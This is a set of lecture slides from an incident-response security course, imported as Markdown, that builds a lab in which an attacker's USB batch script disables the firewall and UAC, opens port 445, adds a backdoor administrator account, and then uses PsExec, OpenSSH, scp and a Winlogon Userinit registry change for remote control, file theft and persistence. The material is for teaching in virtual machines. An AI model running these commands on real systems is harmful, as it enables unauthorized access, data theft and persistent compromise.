---
title: "37강_Explain and solve exercises with vol2_v.1.2"
type: "acs-advance-pdf"
course: "ACS Advanced"
course_folder: "Incident Response"
source_path: "E:\\ProJect\\ACS File\\advance\\Incident Response\\37강_Explain and solve exercises with vol2_v.1.2.pdf"
source_size_bytes: 1571370
source_modified: 2025-11-12T13:34:36
imported_at: 2026-06-14T14:26:57
tags:
  - acs
  - acs-advanced
  - imported
---

# 37강_Explain and solve exercises with vol2_v.1.2

- Source: [37강_Explain and solve exercises with vol2_v.1.2.pdf](file:///E:/ProJect/ACS%20File/advance/Incident%20Response/37%EA%B0%95_Explain%20and%20solve%20exercises%20with%20vol2_v.1.2.pdf)

> Imported from PDF for Obsidian search. Verify formatting against the original file when exact layout matters.

## Page 1

Create a lab question
• Scenario introduction and prior knowledge
• Working with batch scripts
• Utilizing PsExec
37
1

## Page 2

01. current page topic
Scenario introduction and prior knowledge01
2 Windows 10 Pro virtual machines
Virtual Machines
1 recognized USB
USB
2

## Page 3

01. current page topic
PsExec is a free utility used for remote control on Windows operating systems.
Developed by Sysinternals and now managed by Microsoft
This tool allows you to run programs on other networked computers
What is PsExec
PsExec
Remote control features
Run CMD programs or scripts on other networked computers
System-level execution support
PsExec allows programs to run at the system account level, useful for tasks with limited regular user privileges
Interactive mode support
This mode allows you to run the program through the user interface on the remote computer
Passing environment variables
PsExec allows you to pass environment variables to remote computers, ensuring that your program works
correctly in their environment
Features
Caveats
Requires administrator privileges
Firewalls and ports: TCP 445 Port must be open
Download?
Included in the Sysinternals Suite downloaded in
Chapter 0
01 Scenario introduction and prior knowledge
3

## Page 4

01. current page topic
Inter-process Communication Share also stands for
Shared resources for communicating with processes on
other computers
IPC$
Supported features
• Support for remote service control: IPC$ allows users to start, stop, or configure services remotely
• System event notifications: computers can send notifications to other computers about system events
• Registry access: IPC$ allows users to access and modify the registry of other computers over the network
• File sharing: Used by users to transfer or access files over a network
01 Scenario introduction and prior knowledge
4

## Page 5

01. current page topic
Special shares provided by default on Windows systems
Use to facilitate remote management tasks
ADMIN$ is used by some remote administration tools and
scripts (PsExec)
ADMIN$
Similarities, differences
•These are special shares built into Windows that are used for remote control and administration and allow you to
communicate with other computers over the network
•ADMIN$ is of particular concern, as this share allows direct access to system files.
Points to the system root directory (e.g., C:\Windows) This
share allows network administrators to remotely access and
modify system files.
Supported features
01 Scenario introduction and prior knowledge
5

## Page 6

01. current page topic
Victim
ABOUT Victim
A (Victim) was studying in the university library and left her laptop
on and went out for a short time
When he returns to his seat, he logs off the computer
Thought the computer had rebooted because of a routine update
After about 20 minutes, the computer started to slow down and
start behaving in an unwanted way
01 Scenario introduction and prior knowledge
6

## Page 7

01. current page topic
B (Attacker) visits multiple websites with hacker wannabes
You found an unlocked laptop in the library and attempted
to remotely access it
Attacker
ABOUT Attacker
01 Scenario introduction and prior knowledge
7

## Page 8

01. current page topic
Create a lab
PsExec.exe
Batch file
• PsExec copy
• UAC off
• TCP 445 open
• Ip info save
A
Attacker USB
01 Scenario introduction and prior knowledge
8

## Page 9

01. current page topic
UAC
• UAC stands for User Account Control, a security component in the Microsoft Windows operating system that manages the permissions of
user accounts
• It serves to prevent potentially dangerous programs or malicious software from making changes to the system that require administrator
privileges when a user attempts to install an application or change system settings
• UAC makes potentially dangerous tasks more difficult by forcing users to run most tasks with normal user privileges, even on accounts with
administrator privileges
• When UAC is turned off, users don't notice changes to their system, and
malicious software can potentially cause damage to their system
• You run the risk of getting infected with malware during everyday
activities, such as installing programs downloaded from unknown sources
or browsing the internet
• Turning off UAC allows your user account to operate with administrator
privileges, which means that your every action can affect the entire system
• In this situation, if your system is altered by mistake or malicious software,
it is very difficult to undo the damage
Caveats
01 Scenario introduction and prior knowledge
9

## Page 10

01. current page topic
TCP 445 Port
• TCP port 445 is the port primarily used by Microsoft's Server Message Block (SMB) protocol
• The SMB protocol is used to share resources, such as files or printers, between computers on a network
• 445 ports allow Windows computers to share files with other computers or use network printers
• Communicate with Windows domain controllers to handle network sign-in and authentication
• Potential for exploitation by attackers with malicious intent
• WannaCry propagated through these ports
• Port 445 is often blocked by security firewalls, and many Internet Service Providers (ISPs) also block this port

Appropriate security measures
• Use a VPN to secure your network
• Set firewall rules to allow access to only the computers or services you need
Caveats
01 Scenario introduction and prior knowledge
10

## Page 11

01. current page topic
Working with batch scripts02
VICTIM
Running a virtual machine
Victim
Create any file
Create Folders & Files
Victim
11

## Page 12

01. current page topic
Running a virtual machine
Attacker
Install in the System32 path
PsExec
Attacker
Working with batch scripts02
12

## Page 13

01. current page topic
A script that performs a series
of steps on the victim's
computer
Batch Script
Program to remotely control
the victim's computer
PsExec
Attacker-USB
Working with batch scripts02
13

## Page 14

01. current page topic
Firewall off
UAC OFF
Ip to connect to Save to USB
Create a user to connect445 port open
Restart
@echo off
netsh advfirewall set allprofiles state off
netsh advfirewall firewall add rule name="TCP-445" dir=in action=allow protocol=tcp localport=445
reg.exe ADD HKLM\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
copy E:\acs_hk\Psexec.exe %SystemDrive%\Windows\System32\
ipconfig > E:\ACS_hk\Ip.txt
net user control control123 /add
net localgroup Administrators control /add
Shutdown -r
Attacker
Working with batch scripts02
14

## Page 15

01. current page topic
Run Speed as an administrator
Victim
Victim
Working with batch scripts02
15

## Page 16

01. current page topic
Firewall off
TCP 445 Open
Copy and paste PsExec to a system file
Save Ip information to that usb
Create a control account, password: control123
Add to the control account admin group
Reboot the system
Run Result
Victim
After rebooting, you'll see the screen below
Screen print before entering password
Reboot your PC
Working with batch scripts02
16

## Page 17

01. current page topic
Attacker
Victim IP : 10.10.10.18
Stored Ip information
Victim IP : 10.10.10.18
Victim Account : control
control pw : control123
Firewall off
UAC off
TCP 445 Port Open
Victim information known by the attacker
Working with batch scripts02
17

## Page 18

01. current page topic
PsExec03
Attacker
PsExec.exe -I -u control -p control123 \\10.10.10.18 cmd
whoami
Command
cmd access from the control account on the victim PC
Whoami outputs control instead of kusti when
running
18

## Page 19

01. current page topic
OpenSSH
• Open Secure Shell (OpenSSH) is an open source software implementation of Secure Shell (SSH), a protocol that encrypts network
communications to increase security
• Use to remotely control a computer, securely transfer files, and more
• Setting up and managing an OpenSSH server requires appropriate security measures
• Use strong passwords, allow SSH access only when necessary, etc.
Caveats
OpenSSH Server
• The OpenSSH server is responsible for accepting connections from clients using this OpenSSH protocol
• When a client connects to an OpenSSH server, the server encrypts all communication with the client to prevent information from leaking
over the network
OpenSSH Client
• Clients connected to an OpenSSH server can control the server computer remotely
• Manage files on the server or control programs running on the server through a command-line interface
PsExec03
19

## Page 20

01. current page topic
OpenSSH server install in Victim
Attacker
https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell
Powershell commands are available in cmd if you precede the command with Powershell.exe -command
• Use Get-WindowsCapability to see if you can use OpenSSH
• Use Add-WindowsCapability to install server or client components as needed
• Start sshd with Start-Service
• Set the startup type of the SSH Server service (sshd) to 'Automatic' using Set-Service
• Use a conditional statement to check if a firewall rule named OpenSSH-Server-In-TCP exists and output whether it does or not
• If not, create a new firewall rule that allows incoming TCP traffic and opens Port 22
Description
Powershell.exe -command "Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'"
Powershell.exe -command "Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
Powershell.exe -command "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
Powershell.exe -command "Start-Service sshd"
Powershell.exe -command "Set-Service -Name sshd -StartupType 'Automatic'"
Powershell.exe -command "New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -
Protocol TCP -Action Allow -LocalPort 22"
PsExec03
20

## Page 21

01. current page topic
Attacker
Navigate to the C:\Users location to verify
your account
Description.
Go to the desktop of your ACS account to view the
directory
PsExec03
21

## Page 22

01. current page topic
Attacker
Command
Scp control@10.10.10.18:\C:\Users\ACS\Desktop\homework\homework.txt
PsExec03
22

## Page 23

01. current page topic
Attacker
 Victim
Command
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\
 CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d
"C:\Windows\system32\userinit.exe,C:\Windows\system32\control.exe" /f
Command
Verify that the Userinit value has changed in the victim's registry
PsExec03
23

## Page 24

01. current page topic
Victim
Now turn off your computer and run Control Panel
every time it turns off
Result
The control panel was used to avoid harming the virtual
machine, but malicious behaviour could be performed by
injecting malware such as backdoors or ransomware outside
of the control panel
Tips
PsExec03
24
